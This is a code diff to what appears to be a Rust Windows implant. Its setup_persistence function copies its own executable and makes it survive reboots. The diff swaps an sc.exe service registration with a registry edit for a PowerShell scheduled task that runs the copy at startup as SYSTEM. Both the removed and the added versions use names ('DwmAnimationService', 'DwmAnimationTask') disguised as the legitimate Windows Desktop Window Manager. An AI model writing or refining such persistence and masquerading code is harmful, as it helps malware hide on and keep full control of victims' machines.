@@ -4,6 +4,7 @@ use types::Codes;
 use types::Packet;
 
 use std::path::Path;
+use std::process::Command;
 use winreg::{enums::HKEY_LOCAL_MACHINE, RegKey};
 
 use tokio::io::AsyncWriteExt;
@@ -28,41 +29,21 @@ fn setup_persistence(uuid: &str) -> Result<(), Box<dyn std::error::Error>> {
     let dest_path = uuid_dir.join(format!("{}.exe", &uuid));
     std::fs::copy(&current_exe, &dest_path)?;
 
-    // Register the service
-    let service_name = "DwmAnimationService";
-    let service_display_name = "Dwm Animation Service";
-    let service_exe_path = dest_path.to_str().unwrap();
-
-    std::process::Command::new("sc.exe")
-        .args(&[
-            "create",
-            service_name,
-            "binPath=",
-            service_exe_path,
-            "start=",
-            "auto",
-            "DisplayName=",
-            service_display_name,
-        ])
+    let powershell_command = format!(
+        r#"
+        $action = New-ScheduledTaskAction -Execute "{}"
+        $trigger = New-ScheduledTaskTrigger -AtStartup
+        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+        Register-ScheduledTask -TaskName "DwmAnimationTask" -Action $action -Trigger $trigger -Principal $principal -Settings $settings
+    "#,
+        dest_path.display()
+    );
+    Command::new("powershell")
+        .args(&["-Command", &powershell_command])
         .output()
-        .expect("Failed to register the service");
+        .expect("Failed to execute PowerShell command");
 
-    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
-
-    let path = Path::new("SYSTEM")
-        .join("CurrentControlSet")
-        .join("Services")
-        .join(service_name);
-
-    let (key, _) = match hklm.create_subkey(&path) {
-        Ok(key) => key,
-        Err(err) => {
-            println!("{}", err);
-            std::process::exit(1)
-        }
-    };
-    key.set_value("ObjectName", &"LocalSystem")
-        .expect("Failed to set the service to run as admin");
     Ok(())
 }
 
